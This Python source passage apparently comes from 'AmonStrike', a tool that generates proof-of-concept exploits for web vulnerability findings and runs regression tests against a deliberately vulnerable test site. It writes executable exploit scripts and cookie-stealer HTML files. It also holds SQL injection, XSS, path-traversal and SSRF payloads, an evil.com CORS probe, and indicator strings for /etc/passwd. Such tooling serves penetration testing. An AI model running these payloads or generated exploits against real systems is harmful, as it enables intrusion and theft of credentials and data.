print(f"[*] AmonStrike PoC — {title}")
print(f"[*] Target:  {{TARGET}}")
print(f"[*] Payload: {{PAYLOAD}}")
print()

try:
    # Baseline request
    baseline = session.get(TARGET, timeout=TIMEOUT)
    print(f"[*] Baseline: HTTP {{baseline.status_code}} ({{len(baseline.text)}} bytes)")

    # Attack request
    attack = session.get(TARGET, params={{PARAM: PAYLOAD}}, timeout=TIMEOUT)
    print(f"[*] Attack:   HTTP {{attack.status_code}} ({{len(attack.text)}} bytes)")

    # Check for indicators
    indicators = ["error", "sql", "mysql", "exception", "warning",
                  "root:x", "daemon:", "/etc/passwd", "alert(", "49"]
    
    found = [i for i in indicators if i.lower() in attack.text.lower()]
    
    if found:
        print(f"[+] VULNERABLE — Indicators found: {{found}}")
        print(f"[+] Response snippet:")
        print(attack.text[:500])
    elif len(attack.text) != len(baseline.text):
        print(f"[~] Possible — Response length differs: {{len(baseline.text)}} vs {{len(attack.text)}}")
    else:
        print(f"[-] No obvious indicator — manual verification needed")

except Exception as e:
    print(f"[!] Error: {{e}}", file=sys.stderr)
    sys.exit(1)
"""

    def _build_reproduction_steps(self, f: dict, poc: dict) -> str:
        steps = poc.get("manual_steps", [])
        title = f.get("title","")

        lines = [
            f"# Reproduction Steps — {title}",
            f"# Target: {f.get('url', self.target_url)}",
            f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "# " + "="*60,
            "",
        ]
        lines.extend(steps)
        return "\n".join(lines)

    def _build_impact_proof(self, f: dict) -> str:
        module = f.get("module","")
        sev    = f.get("severity","")

        impact_map = {
            "sqli":     "Full database read/write. User credentials exposed. Authentication bypass. Potential OS command execution via INTO OUTFILE or xp_cmdshell.",
            "xss":      "Session hijacking for every user who visits page. Credential phishing within trusted domain. Keylogging. Browser-based lateral movement.",
            "ssrf":     "Internal network access. Cloud credentials theft (AWS/GCP/Azure). Potential RCE via SSRF to internal services.",
            "lfi":      "Read all files readable by web server (configs, keys, passwords, source code). Potential RCE via log poisoning.",
            "rce":      "Complete server compromise. Data exfiltration. Ransomware deployment. Lateral movement to internal network.",
            "idor":     "Unauthorized access to all user data. Privacy violation at scale (all accounts). Regulatory exposure (GDPR, HIPAA, PCI).",
            "cors":     "Cross-origin data theft. An attacker site can read any authenticated response from victims' browsers.",
            "csrf":     "Perform any action as victim without their knowledge. Account modification, data deletion, financial transactions.",
            "takeover": "Attacker hosts arbitrary content under trusted domain. Phishing with trusted SSL. Cookie theft (same-site attacks).",
            "credentials": "Full authenticated access to admin panel, API, or database. Attacker can do anything an admin can do.",
            "jwt":      "Forge authentication tokens for any user. Bypass authentication entirely. Escalate to admin privileges.",
            "ssti":     "Template injection often leads directly to RCE. Read secrets, env variables, execute OS commands.",
        }

        return impact_map.get(module,
            f"This {sev.lower()} severity vulnerability impacts the security posture of the application.")

    def _build_remediation_test(self, f: dict) -> str:
        module = f.get("module","")

        tests = {
            "sqli": "After fix: retest with ' OR 1=1-- in all parameters. Must return error or same response as valid input.",
            "xss":  "After fix: test <script>alert(1)</script> in all inputs. Must be encoded in HTML output.",
            "ssrf": "After fix: test http://169.254.169.254/ in URL parameters. Must receive error or blocked response.",
            "lfi":  "After fix: test ../../../../etc/passwd in file parameters. Must return 400/403 or sanitized path.",
            "cors": "After fix: test with Origin: https://evil.com. Must NOT reflect attacker origin.",
            "headers": "After fix: curl -I URL | grep -i security. Must show all required security headers.",
        }

        return tests.get(module,
            "Retest the specific payload after fix is applied. Document the fixed response.")

    def _save_poc(self, f: dict, poc: dict) -> dict:
        """Save all PoC artifacts to files."""
        saved = {}
        title_safe = f.get("title","poc")[:30].replace(" ","_").replace("/","_")
        module      = f.get("module","generic")
        prefix      = os.path.join(self.output_dir, f"poc_{module}_{title_safe}")

        # Python script
        script = poc.get("python_script","")
        if script:
            path = prefix + "_exploit.py"
            with open(path,"w") as fh:
                fh.write(script)
            os.chmod(path, 0o755)
            saved["python_exploit"] = path

        # HTML exploit (XSS, CORS, CSRF)
        for key in ["cookie_stealer_html","exploit_html","proof_html","clickjack_poc"]:
            html = poc.get(key,"")
            if html:
                path = prefix + f"_{key}.html"
                with open(path,"w") as fh:
                    fh.write(html)
                saved[key] = path

        # Shell script
        for key in ["sqlmap_command","dalfox_command","nmap_command"]:
            cmd = poc.get(key,"")
            if cmd:
                path = prefix + f"_{key}.sh"
                with open(path,"w") as fh:
                    fh.write(f"#!/bin/bash\n# AmonStrike PoC Command\n{cmd}\n")
                os.chmod(path, 0o755)
                saved[key] = path

        # Automation scripts
        for key in ["automation_script","none_alg_script","weak_secret_script",
                    "credential_test_script","script"]:
            script_code = poc.get(key,"")
            if script_code:
                path = prefix + f"_{key}.py"
                with open(path,"w") as fh:
                    fh.write(script_code)
                os.chmod(path, 0o755)
                saved[key] = path

        # Reproduction steps
        repro = poc.get("reproduction","")
        if repro:
            path = prefix + "_reproduction.txt"
            with open(path,"w") as fh:
                fh.write(repro)
            saved["reproduction"] = path

        # Full JSON
        path = prefix + "_full.json"
        with open(path,"w") as fh:
            json.dump({
                "finding":  f,
                "poc":      {k:v for k,v in poc.items() if k != "files"},
                "generated_at": datetime.now().isoformat(),
            }, fh, indent=2, default=str)
        saved["full_json"] = path

        return saved

    def generate_all(self, findings: list) -> list:
        """Generate PoC for all findings, prioritizing critical/high."""
        results = []
        priority_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
        sorted_findings = sorted(
            findings,
            key=lambda x: priority_order.get(x.get("severity","INFO"),4)
        )
        for finding in sorted_findings:
            try:
                poc = self.generate(finding)
                results.append({**finding, "poc": poc})
            except Exception as e:
                results.append({**finding, "poc": {"error": str(e)}})
        return results


# ── Tests ─────────────────────────────────────────────────────

def run_regression_tests():
    import tempfile
    print("\n=== POC GENERATOR REGRESSION TESTS ===")
    passed = failed = 0
    tmp = tempfile.mkdtemp()
    gen = PocGenerator(tmp, "http://testphp.vulnweb.com")

    findings = {
        "sqli":     {"title":"SQL Injection","severity":"CRITICAL","module":"sqli",
                     "url":"http://testphp.vulnweb.com/artists.php?artist=1",
                     "parameter":"artist","payload":"' OR 1=1--"},
        "xss":      {"title":"Reflected XSS","severity":"HIGH","module":"xss",
                     "url":"http://testphp.vulnweb.com/search.php",
                     "parameter":"searchFor","payload":"<script>alert(1)</script>"},
        "ssrf":     {"title":"SSRF","severity":"CRITICAL","module":"ssrf",
                     "url":"http://testphp.vulnweb.com/api","parameter":"url"},
        "lfi":      {"title":"LFI","severity":"CRITICAL","module":"lfi",
                     "url":"http://testphp.vulnweb.com/showimage.php",
                     "parameter":"file","payload":"../../../../etc/passwd"},
        "cors":     {"title":"CORS","severity":"MEDIUM","module":"cors",
                     "url":"http://testphp.vulnweb.com"},
        "csrf":     {"title":"CSRF","severity":"MEDIUM","module":"csrf",
                     "url":"http://testphp.vulnweb.com/user/settings"},
        "auth":     {"title":"Default Credentials","severity":"CRITICAL","module":"auth",
                     "url":"http://testphp.vulnweb.com/login.php"},
        "jwt_deep": {"title":"JWT None Algorithm","severity":"CRITICAL","module":"jwt_deep",
                     "url":"http://testphp.vulnweb.com/api/auth"},
        "ssti":     {"title":"SSTI Jinja2","severity":"CRITICAL","module":"ssti",
                     "url":"http://testphp.vulnweb.com/render","parameter":"template"},
        "rce":      {"title":"RCE","severity":"CRITICAL","module":"rce",
                     "url":"http://testphp.vulnweb.com/ping","parameter":"host"},
    }

    tests = []
    for mod, finding in findings.items():
        poc = gen.generate(finding)
        tests += [
            (f"{mod}: poc generated",
             lambda m=mod, f=finding: isinstance(gen.generate(f), dict)),
            (f"{mod}: has manual_steps",
             lambda m=mod, f=finding: len(gen.generate(f).get("manual_steps",[])) >= 3),
            (f"{mod}: has python_script",
             lambda m=mod, f=finding: len(gen.generate(f).get("python_script","")) > 100),
            (f"{mod}: has curl_command",
             lambda m=mod, f=finding: len(gen.generate(f).get("curl_command","")) > 5),
            (f"{mod}: files saved",
             lambda m=mod, f=finding: len(gen.generate(f).get("files",{})) > 0),
        ]

    # Extra tests
    tests += [
        ("generate_all works on list",
         lambda: isinstance(gen.generate_all(list(findings.values())), list)),
        ("generate_all returns same count",
         lambda: len(gen.generate_all(list(findings.values()))) == len(findings)),
        ("impact proof non-empty",
         lambda: len(gen._build_impact_proof(list(findings.values())[0])) > 20),
        ("remediation test non-empty",
         lambda: len(gen._build_remediation_test(list(findings.values())[0])) > 10),
        ("output dir created",
         lambda: os.path.isdir(tmp)),
    ]

    for name, fn in tests:
        try:
            if fn():
                passed += 1
                print(f"  ✓ {name}")
            else:
                failed += 1
                print(f"  ✗ {name}")
        except Exception as e:
            failed += 1
            print(f"  ✗ {name} — {e}")

    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed


if __name__ == "__main__":
    import sys
    rp, rf = run_regression_tests()
    sys.exit(0 if rf == 0 else 1)
